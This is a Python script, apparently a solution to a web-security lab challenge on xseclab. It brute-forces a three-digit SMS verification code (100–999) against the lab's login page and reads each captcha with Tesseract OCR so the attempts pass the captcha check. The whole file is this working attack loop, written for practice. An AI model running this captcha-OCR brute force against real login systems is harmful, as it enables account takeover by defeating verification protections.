'''
需要自行安装tesseract-OCR:https://github.com/UB-Mannheim/tesseract/wiki
此处调用了python2，因为不兼容问题多多
尝试多线程失败，目测是调用程序太慢
'''

import os
import requests
import threading
from timedec import UsedTimeDec
# import pytesseract

threads = []
lock = threading.Lock()
cnt = 0
res = ''
data = {
    'username': 13388886666,
    'mobi_code': '',
    'user_code': '',
    'Login': 'submit',
}
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36',
    'Cookie': 'PHPSESSID=69702221f651c0c9127485f6d1951443'
}
index_url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php'
login_url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'
img_url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'

def run(i):
    # s = requests.session()
    # s.get(index_url)
    # s.get(index_url + '#')
    global cnt
    global res
    with open('../captcha/captcha_{}.jpg'.format(i), 'wb') as f:
        f.write(requests.get(img_url, headers=header).content)
    # lock.acquire()
    captcha = os.popen('py -2 ./pytesseract.py ' + '../captcha/captcha_{}.jpg'.format(i)).read()
    # captcha = pytesseract.image_to_string('./captcha/captcha_{}.jpg'.format(i))
    # lock.release()
    #对该验证码优化
    captcha = captcha.strip()
    captcha = captcha.replace(' ', '')
    captcha = captcha.replace('o', '0')
    captcha = captcha.replace('掳', '0')

    data['mobi_code'] = str(i)
    data['user_code'] = str(captcha)
    ret = requests.post(login_url, headers=header, data=data).text
    print(i, captcha)
    if captcha == '':
        cnt += 1
    if 'error' not in ret:
        print(ret)
        res = ret

@UsedTimeDec
def main():

    for i in range(100, 1000):
        run(i)
    #     t = threading.Thread(target=run, args=(i,))
    #     threads.append(t)
    #     t.start()

    # for t in threads:
    #     t.join()

    # 执行删除验证码图片
    for root , dirs, files in os.walk(r'..\\captcha\\'):
        for name in files:
            if name.endswith(".jpg"):
                os.remove(os.path.join(root, name))
                print ("Delete File: " + os.path.join(root, name))

    print("useless conut: {}".format(cnt))
    print(res)

if __name__ == '__main__':
    main()
